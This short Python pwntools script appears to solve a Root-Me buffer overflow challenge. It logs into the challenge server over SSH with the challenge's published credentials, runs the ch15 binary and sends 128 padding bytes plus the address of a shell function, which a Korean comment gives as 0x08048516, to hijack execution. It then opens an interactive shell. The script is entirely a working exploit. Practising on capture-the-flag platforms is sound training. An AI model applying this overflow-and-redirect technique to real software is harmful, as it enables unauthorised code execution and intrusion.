#rootMe bof2

from pwn import *

s = ssh(host="challenge02.root-me.org",user="app-systeme-ch15",port=2222,password="app-systeme-ch15")
r=s.process("./ch15")
#shell의 주소가 0x08048516이다.

r.sendline(b"\xaa"*128 + b"\x16\x85\x04\x08")

r.interactive()